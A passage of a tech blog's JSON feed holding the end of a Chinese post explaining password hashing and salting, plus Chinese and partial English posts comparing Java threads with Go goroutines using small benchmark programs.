也一起被盜了。</p>\n<p>所以，有時候某個網站被盜帳號可能不是那個網站的問題，而是駭客在其他地方拿到了你的帳號密碼，就來這邊試試看，沒想到就中了。</p>\n<p>對於網站的開發者而言，保護好使用者的個資是天經地義的事情，保護密碼也是，有沒有什麼好方法可以保護密碼呢？</p>\n<p>加密嗎？把密碼用某些演算法加密，這樣資料庫儲存的就會是加密後的結果，儘管被偷走了，駭客只要沒有解密的方法就解不開。</p>\n<p>聽起來似乎是最安全的做法了，但其實還有一個問題，那就是網站的開發者還是會知道怎麼解密，如果有工程師監守自盜怎麼辦？他還是可以知道每個使用者的密碼是什麼，可以把這些資訊拿去賣或者是自己利用。</p>\n<p>嗯…似乎我們也不能怎麼樣，因為無論如何，開發者都需要有方法知道資料庫存的密碼究竟是多少吧？不然在登入的時候怎麼確認帳號密碼是對的？</p>\n<p>再者，這樣聽起來應該夠安全了，要怎麼樣才能更安全？難道要連網站的開發者都無法解密，都不知道密碼是什麼才夠安全嗎？</p>\n<p>Bingo！答對了，就是要這樣沒錯！</p>\n<h2 id=\"%E6%B2%92%E6%9C%89%E4%BA%BA%E7%9F%A5%E9%81%93%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A2%BC%EF%BC%8C%E5%8C%85%E6%8B%AC%E7%B6%B2%E7%AB%99%E6%9C%AC%E8%BA%AB\"><a class=\"direct-link\" href=\"#%E6%B2%92%E6%9C%89%E4%BA%BA%E7%9F%A5%E9%81%93%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A2%BC%EF%BC%8C%E5%8C%85%E6%8B%AC%E7%B6%B2%E7%AB%99%E6%9C%AC%E8%BA%AB\">#</a> 沒有人知道你的密碼，包括網站本身</h2>\n<p>事實上，網站的資料庫是不會儲存你的密碼的。</p>\n<p>或更精確地說，不會儲存你的「原始密碼」，但會儲存密碼經過某種運算後的結果，而且最重要的是，這個運算是無法還原的。</p>\n<p>直接舉例比較快，假設今天有個很簡單的演算法，可以把密碼做轉換，轉換方式是：「數字不做轉換，英文字母把 a 換成 1，b 換成 2…z 換成 26」，以此類推，第幾個字母就換成幾，大小寫不分都一樣（先假設不會有符號）。</p>\n<p>如果密碼是 abc123，轉換完就變成 123123。</p>\n<p>在使用者註冊的時候，網站就把使用者輸入的 abc123 轉成 123123，然後存到資料庫裡面。因此資料庫存的密碼是 123123，而不是 abc123。</p>\n<p>當使用者登入時，我們就再把輸入的值用同樣的邏輯轉換，如果輸入一樣，轉換後的結果就會一樣對吧？就知道密碼是不是正確的。</p>\n<p>當駭客把資料庫偷走以後，會拿到 123123 這組密碼，那一樣啊，不是可以推論出原本是 abc123 嗎？不不不，沒這麼簡單。</p>\n<p>123123、abcabc、12cab3…這些密碼轉換之後，不也是 123123 嗎？所以儘管知道轉換規則跟結果，卻沒有辦法還原成「唯一一組密碼」，這就是這個演算法厲害的地方！</p>\n<p>這樣的轉換就叫做雜湊（Hash），abc123 每次 hash 過後的結果都會是 123123，但是從 123123 卻無法推回輸入一定是 abc123，因為有其他種可能性存在。</p>\n<p>這就是 hash 跟加密最大的不同。</p>\n<p>加密跟解密是成對的，如果可以加密就一定可以解密，所以你知道密文跟密鑰，就可以知道明文。但 hash 不同，你知道 hash 的演算法跟結果，卻無法回推出原本的輸入是什麼。</p>\n<p>而這個機制最常見的應用之一，就在於密碼的儲存。</p>\n<p>在註冊時把 hash 過後的密碼存進資料庫，登入時把輸入的密碼 hash 過後跟資料庫比對，就知道密碼是否正確。就算資料庫被偷，駭客也不知道使用者的密碼是什麼，因為回推不出來。</p>\n<p>這就是為什麼忘記密碼的時候，網站不會跟你講原本的密碼是什麼，因為網站本身也不知道啊！</p>\n<p>所以不能「找回密碼」，只能「重設密碼」，因為重設就代表你輸入新的密碼，然後網站把新的密碼 hash 之後存進資料庫，未來登入時就會用這組新的 hash 去比對。</p>\n<p>有些人可能會注意到這樣的儲存方式似乎有個漏洞，延續前面的例子，資料庫存的是 123123 而我的原始密碼是 abc123，這樣如果用「abcabc」，hash 過後也是 123123，不就也可以登入嗎？這樣不太對吧，這不是我的密碼欸</p>\n<p>有兩個不同的輸入卻產生出同一組輸出，這種狀況稱為碰撞（hash collision），碰撞一定會發生，但如果演算法設計的好，碰撞的機率就超級無敵小，小到幾乎可以忽略。</p>\n<p>前面提的轉換規則只是為了方便舉例，真實世界中用的演算法複雜許多，就算只有一個字不同，結果都會天差地遠，以 SHA256 這個演算法為例：</p>\n<ol>\n<li>abc123 =&gt; 6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090</li>\n<li>abc124 =&gt; cd7011e7a6b27d44ce22a71a4cdfc2c47d5c67e335319ed7f6ae72cc03d7d63f</li>\n</ol>\n<p>類似的輸入卻產生截然不同的輸出。</p>\n<p>像我前面舉例用的轉換就是不安全的 hash 演算法，要盡量避免使用或是避免自己設計，盡可能使用密碼學家跟專家設計出的演算法，像是上面提到的 SHA256。</p>\n<p>在使用這些演算法的時候，也要特別注意一下是否安全，因為有些演算法雖然也是由專家設計，但已經被證明是不安全的，例如說密碼用 MD5 來 hash 後儲存就是不安全的，可以參考：<a href=\"https://security.stackexchange.com/questions/19906/is-md5-considered-insecure\">Is MD5 considered insecure?</a></p>\n<h2 id=\"%E6%89%80%E4%BB%A5%EF%BC%8C%E5%84%B2%E5%AD%98-hash-%E5%BE%8C%E7%9A%84%E5%80%BC%E5%B0%B1%E6%B2%92%E4%BA%8B%E4%BA%86%E5%97%8E%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E6%89%80%E4%BB%A5%EF%BC%8C%E5%84%B2%E5%AD%98-hash-%E5%BE%8C%E7%9A%84%E5%80%BC%E5%B0%B1%E6%B2%92%E4%BA%8B%E4%BA%86%E5%97%8E%EF%BC%9F\">#</a> 所以，儲存 hash 後的值就沒事了嗎？</h2>\n<p>抱歉，其實只儲存密碼 hash 過後的值是不夠的。</p>\n<p>咦，為什麼？我剛剛不是說沒辦法反推出結果嗎，那為什麼不夠？</p>\n<p>雖然說沒辦法反推出結果，但攻擊者可以利用「輸入一樣，輸出一定一樣」的特性，先建好一個資料庫。</p>\n<p>舉例來說，假設有個很常見的密碼 abc123，hash 過後的值是 6ca13d，那攻擊者就可以先算好，然後把這個關係存在資料庫，所以攻擊者的資料庫裡面就可能會有一百萬組最常見密碼的清單，裡面有著每個密碼跟它 hash 過後的值。</p>\n<p>那接下來只要在 hash 過後的資料庫發現 6ca13d，攻擊者就可以透過查表的方式，查出原本的密碼是 abc123。這不是利用演算法反推結果，這只是利用現有資料來查詢而已。</p>\n<p>為了防禦這種攻擊，還要做一件事情叫做加鹽（Salting），沒錯，就是鹽巴的那個鹽。通常會幫每個使用者產生一個獨一無二的鹽巴，例如說 5ab3od（實際上會更長，可能 16 或 32 個字以上），接著把我的密碼 abc123 加上我的鹽巴，變成 abc1235ab3od，然後用這個加鹽過後的結果去做 hash。</p>\n<p>為什麼要這樣做呢？</p>\n<p>因為攻擊者預先準備好的表格中，比起 abc123，出現 abc1235ab3od 的機率顯然更低，同時又因為長度變長了，暴力破解的難度變得更高。如此一來，密碼就變得更難破解了。</p>\n<p>更多資訊請參考：<a href=\"https://www.ithome.com.tw/voice/127918\">不是祕密的祕密</a></p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>忘記密碼時網站不會把密碼寄給我，因為網站自己都不知道我的密碼是什麼。雖然聽起來不太可能，但實際狀況就是如此。為了安全性，這是必須的手段。</p>\n<p>要達成這樣的目的，背後最重要的技術原理就是 hash，「同樣的密碼會產生同樣的 hash 值，但從 hash 值沒辦法對應回原本的密碼」就是秘訣所在。</p>\n<p>反之，如果你發現有網站可以找回你的密碼，那就得要多加注意，有可能網站資料庫存的不是 hash 值而是你的密碼。在這種狀況下，萬一有天資料庫被入侵，帳密被偷走，駭客就能得知你真實的密碼，然後去試其他的服務。</p>\n<p>有關於密碼管理，現在瀏覽器也有功能可以自動幫你產生密碼外加記憶密碼，或也可以使用現成的密碼管理軟體，都可以在不同網站產生不同的密碼。</p>\n<p>這篇希望能讓對這個領域陌生的讀者們也能知道一些基本的概念，包括：</p>\n<ol>\n<li>有些網站比你想得脆弱很多，改個網址就可以拿到別人的資料</li>\n<li>對於安全性做得不好的網站，拿到整個資料庫不是一件難事</li>\n<li>忘記密碼只能重設，不能找回，是因為網站也不知道你的密碼</li>\n<li>如果有網站可以把舊密碼給你，那你得要小心一點</li>\n</ol>\n",
      "date_published": "2021-07-09T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-zh/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-zh/",
      "title": "Java’s Thread Model and Golang Goroutine",
      "content_html": "<!-- summary -->\n<p>說到 Golang，總會提到其高併發的特性，而 goroutine 則是撐起 Golang 高併發的基礎。本文試著比較 Java thread 和 Golng goroutine 在 OS 運行的方式，讓大家能理解 goroutine 在設計上的獨到之處。</p>\n<!-- summary -->\n<h1 id=\"java-thread\"><a class=\"direct-link\" href=\"#java-thread\">#</a> Java Thread</h1>\n<p>Java thread 直接使用 OS 提供的 native thread，即是每一個 Java thread 都是對應 OS 的 thread，完全依賴 OS 去排程調度：</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/thread-model-os-thread.png\" alt=\"\"></p>\n<p>下面是一段簡單的 Java code，內容是創建 1000 個 thread：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>當你在 linux 上跑起來用 ps 指令觀察 java 程序，可以看到該程序使用了 1018 個 thread (其中 18 個為 jvm 本身系統使用的 thread，例如 GC 之類的)。</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">102763</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><span class=\"token number\">1018</span></code></pre>\n<p>但隨著時代演進，曾經被稱為 lightweight process 的 thread，也逐漸無法應付高併發的場景。</p>\n<h2 id=\"%E5%8E%9F%E7%94%9F-thread-%E7%9A%84%E5%95%8F%E9%A1%8C\"><a class=\"direct-link\" href=\"#%E5%8E%9F%E7%94%9F-thread-%E7%9A%84%E5%95%8F%E9%A1%8C\">#</a> 原生 Thread 的問題</h2>\n<ol>\n<li>記憶體<br>\nJava 每創建一個 thread 都會分配一個固定的 memory 作為 stack 使用。也就是 OS 的記憶體和 SWAP 空間會限制 Java Application 創建 thread 的數量上限，即便 Java Application 實際上沒用到這麼多記憶體。<br>\n另外你可以在啟動 Java 時用 -Xss 指令指定 thread 佔用的記憶體大小，但實際上太小也會導致 Jvm 無法啟動。像我的筆電指定記憶體小於 135k 就會出錯。</li>\n<li>創建 thread 和 Context Switch 的開銷<br>\n當 thread 數量超過 core 數量的時候，OS 會透過排程盡可能讓每個 thread 都能公平的佔用 core，而 core 把執行到一半的 thread 狀態存起來，切換到另一個 thread 執行就是 Context Switch。<br>\ncontext switch 本身也是會佔用 core 運算資源的。當 thread 數量過多時，會造成 core 花在創建/銷毀 thread 和 Context Switch上的比例變多，變相減少 throughput。</li>\n</ol>\n<p>下這是一段段用 ExecutorService 的 thread pool 執行 200000 次 doSomething function 的 java code，用來實驗 thread 的開銷有多昂貴：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">Random</span> random <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">int</span> anInt <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> threadNum <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span>threadNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">200000</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>            <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">awaitTermination</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Long</span><span class=\"token punctuation\">.</span>MAX_VALUE<span class=\"token punctuation\">,</span> <span class=\"token class-name\">TimeUnit</span><span class=\"token punctuation\">.</span>NANOSECONDS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>我嘗試把 thread poll 的 thread 數量從 100~9000 去執行，去比較執行時間：</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/measure-thread-loading.png\" alt=\"\"></p>\n<p>可以看到使用越多 thread 數量越高反而執行時間越久。試著 profile 程式可以看到當 thread num 為 100 時，cpu 花在 <em>doSomething 的時間佔比約為 51%，如下：</em></p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-10.png\" alt=\"\"></p>\n<p>而當 thread num 為 9900 時，<strong><em>doSomething</em></strong> <em>的 cpu 佔用時間比例驟降到 27%。</em></p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-990.png\" alt=\"\"></p>\n<p>種種跡象都告訴我們，thread 昂貴的開銷，讓 Java 在高併發的場景是略顯無力的。</p>\n<h1 id=\"goroutine-%E6%80%8E%E9%BA%BC%E5%81%9A%EF%BC%9F\"><a class=\"direct-link\" href=\"#goroutine-%E6%80%8E%E9%BA%BC%E5%81%9A%EF%BC%9F\">#</a> Goroutine 怎麼做？</h1>\n<p>相較 Java 使用 native thread，依賴 OS 原生的 scheduler 去調度，goroutine 實作自己的 scheduler，自行調度 goroutinue 在固定的 thread 間執行：</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/go-scheduler-1.png\" alt=\"\"></p>\n<p>Thread 大約每執行一個 goroutine 10ms 就會切換到另一個 thread。而 thread 挑選 goroutine 的優先順序為</p>\n<ol>\n<li>每個 thread 各自的 queue 中的 goroutine</li>\n<li>global queue 中的 goroutine</li>\n<li>從其他 thread 的 queue 竊取 (work-stealing)</li>\n</ol>\n<blockquote>\n<p>Golang 用 GOMAXPROCS 這參數決定 gouroutine 使用多少 thread，預設是 core 數量。</p>\n</blockquote>\n<p>實際看一下在 linux 上跑 goroutine 的 thread 數量，下面是執行的 golang code:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>實際在我的開發環境觀察 thread 數量都在 4~6 左右。</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">1013506</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><br><span class=\"token number\">5</span></code></pre>\n<h2 id=\"goroutine-%E7%9A%84%E8%A8%98%E6%86%B6%E9%AB%94\"><a class=\"direct-link\" href=\"#goroutine-%E7%9A%84%E8%A8%98%E6%86%B6%E9%AB%94\">#</a> Goroutine 的記憶體</h2>\n<p>一開始創建 goroutine 時會先分配 4k 的記憶體，隨著 goroutine 使用量會動態擴展。相較 Java 的 thread 模型，golang 會比較難被記憶體大小限制著上限。</p>\n<h2 id=\"blocking-system-call\"><a class=\"direct-link\" href=\"#blocking-system-call\">#</a> Blocking System Call</h2>\n<p>目前為止看起來很美好，但如果 thread 被 blocking system call 卡住呢 (ex. 讀大檔案)？例如下圖有三個 goroutine 透過 io system call 讀大檔案，此時會導致全部的 goroutinue 只依賴一個 thread 執行，大幅減少 core 的利用率。</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-1.png\" alt=\"\"></p>\n<p>為了解決這問題，golang 在 thread 和 goroutine 間再隔一層 process 如下：</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-2.png\" alt=\"\"></p>\n<p>而當有 thread 被 system call block 住時，golang 會另外創建新的 thread 接手該 processor 的工作，而原本的 thread 則繼續執行 system call。</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-3.png\" alt=\"\"></p>\n<p>實際用下面的 code，開 1000 個 goroutine 讀大檔案測試：</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">readBigFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tfi<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bigfile\"</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token keyword\">defer</span> fi<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\tbuf <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\tn<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> fi<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> err <span class=\"token operator\">!=</span> io<span class=\"token punctuation\">.</span>EOF <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token keyword\">if</span> <span class=\"token number\">0</span> <span class=\"token operator\">==</span> n <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">break</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token function\">readBigFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>跑起來以後觀察該程式啟動的 thread 會增加到 1xx：</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">1013506</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><br><span class=\"token number\">142</span></code></pre>\n<p>由此我們也可以知道，當 Golang 頻繁開 goroutine 去 call blocking system call 時，其併發量可能會退化到 Java 使用 native thread 一樣。</p>\n<blockquote>\n<p>如果你想更深入了解 goroutine scheduler，可以參考 <a href=\"https://www.youtube.com/watch?v=-K11rY57K7k&amp;t=316s&amp;ab_channel=Hydra\">Go scheduler: Implementing language with lightweight concurrency</a>。</p>\n</blockquote>\n<h1 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h1>\n<p>目前為止我們討論了 Java 如何實現併發和面臨的問題，以及 goroutine 如何在解決這些問題。但這不代表 Java 對高併發束手無策。</p>\n<p>實際上目前 Java 有個 <a href=\"https://blogs.oracle.com/javamagazine/going-inside-javas-project-loom-and-virtual-threads\">Loom Project</a>，就是要在 JVM 上實作類似 goroutine 機制的 virtual thread。或許在下一個 Java 的 LTS 版本，我們就能在 Java 上感受 Goroutine 輕巧。</p>\n<blockquote>\n<p>題外話，我個人覺得比較有趣的點是 Java 1.2 前 Java 的 thread 設計其實跟 goroutine 很像，是在 OS thread 上跑 Java thread，但在多核心的環境遇到一些效能問題才在 Java 1.3 以後改為使用 native thread。但隨著時代演進，Java 又要改回在 thread 上跑 thread 的設計。</p>\n</blockquote>\n<blockquote>\n<p>讓我不禁想：會不會未來有一天 OS 有原生類似 goroutine 的機制以後，各大語言又會又轉而改使用 OS 原生的併發機制呢，而不使用自己實作的 scheduler 呢？</p>\n</blockquote>\n",
      "date_published": "2021-07-05T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-en/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-en/",
      "title": "Java’s Thread Model and Golang Goroutine",
      "content_html": "<!-- summary -->\n<p>One of the most important features of Golang is its ability to handle high concurrency. And goroutine is the foundation to support high concurrency. This article will briefly explain how Java’s thread model and Golang’s goroutine work in OS. And I believe you will be impressive in the principle behind goroutine. Let’s go!</p>\n<!-- summary -->\n<h1 id=\"java-thread-model\"><a class=\"direct-link\" href=\"#java-thread-model\">#</a> Java Thread Model</h1>\n<p>Java uses native thread in OS. That is every Java thread mapping to one kernel thread. Java can not determine which thread would occupy the core, it is completely dependent on OS’s scheduler.</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/thread-model-os-thread.png\" alt=\"\"></p>\n<p>Below is a simple java code that creates 1000 threads and does nothing:</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span 